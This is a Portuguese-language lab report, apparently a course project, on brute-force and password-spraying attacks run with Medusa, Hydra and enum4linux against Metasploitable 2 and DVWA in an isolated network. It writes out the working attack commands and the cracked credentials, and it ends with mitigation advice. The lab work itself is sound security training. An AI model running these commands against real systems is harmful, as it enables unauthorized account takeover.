
```markdown
# Relatório de Segurança: Auditoria com Medusa, Hydra e Kali Linux
**Desafio de Projeto - DIO**

## Introdução
Este projeto detalha a execução de testes de segurança em um ambiente controlado. O objetivo principal foi simular ataques de força bruta, avaliar a eficácia das ferramentas de segurança ofensiva e, a partir dos resultados, propor medidas de mitigação. 

As principais ferramentas exploradas foram **Medusa** e **Hydra**, atuando a partir de uma máquina **Kali Linux** contra o ambiente intencionalmente vulnerável **Metasploitable 2**.

---

## Configuração do Ambiente
*   **Atacante:** Kali Linux
*   **Alvo vulnerável:** Metasploitable 2 (IP: `192.168.56.101`)
*   **Rede:** VirtualBox (Configuração: Host-Only Adapter)

---

## Cenário 1: Força Bruta em Serviço FTP
O serviço FTP foi o primeiro alvo, utilizando um ataque clássico de dicionário. 

**Wordlists utilizadas:**
```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

```

**Execução (Medusa):**

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6

```

**Resultado:**

```text
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]

```

---

## Cenário 2: Ataque Web (Falsos Positivos e Correção)

O segundo cenário teve como foco o formulário de login do **DVWA**.

Inicialmente, o ataque foi executado utilizando o módulo `-M http` do Medusa. **No entanto, isso gerou falsos positivos em todas as tentativas.**

**O Problema:** Descobriu-se que o módulo `-M http` não é o ideal para lidar com formulários web complexos (POST). Ao inserir uma credencial inválida, o servidor recarrega a página de login com um aviso de erro, mas devolve o status HTTP `200 OK`. O Medusa interpretou erroneamente esse status `200` como um login bem-sucedido.

Para corrigir isso, a estratégia foi alterada para utilizar o **Hydra**, que possui suporte superior para validação de formulários.

**Execução Corrigida (Hydra):**

```bash
hydra -L users.txt -P pass.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -t 6

```

**Resultado Validado:**

```text
[80][http-post-form] host: 192.168.56.101   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found

```

---

## Cenário 3: Enumeração e Password Spraying (SMB)

O terceiro cenário abordou o serviço Samba (SMB). Antes do ataque direto, foi feito um mapeamento do alvo.

**Enumeração (Enum4linux):**

```bash
enum4linux -a 192.168.56.101

```

*Resultados da enumeração:*

* Usuários descobertos: `msfadmin`, `root`, `service`, `user`.
* Política de senha: Complexidade desabilitada e comprimento mínimo exigido é zero.

Com base nessas informações, aplicamos a técnica de **Password Spraying** (testar poucas senhas prováveis em vários usuários).

**Execução (Medusa):**

```bash
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2

```

**Resultado:**

```text
ACCOUNT FOUND: [smbnt] User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]

```

---

## 🛑 Mitigações Recomendadas

Para proteger uma infraestrutura contra as vulnerabilidades exploradas neste laboratório, recomenda-se:

* [ ] **Políticas de Senha Rígidas:** Exigir comprimento mínimo (ex: 12+ caracteres) e complexidade (combinação de letras, números e símbolos).
* [ ] **Rate Limiting e Bloqueios:** Configurar soluções como o `fail2ban` ou Web Application Firewalls (WAF) para bloquear temporariamente IPs que excedam limites de tentativas de falha.
* [ ] **Segurança de Protocolos:**
* Desativar a versão legada SMBv1.
* Exigir assinatura digital (*SMB Signing*).
* Desativar serviços FTP não criptografados e migrar o tráfego para SFTP.


* [ ] **Monitoramento Contínuo:** Auditar logs de autenticação ativamente para detectar padrões de força bruta precocemente.

---

## 🧠 Conclusão

A prática demonstrou de forma clara que a facilidade de comprometimento de um sistema está diretamente ligada a falhas básicas de configuração e políticas de identidade fracas. Além disso, o cenário de teste Web comprovou que o domínio técnico das ferramentas — sabendo escolher a correta (Hydra vs. Medusa) e interpretar falsos positivos — é essencial para garantir a precisão de uma auditoria de segurança.

```

```
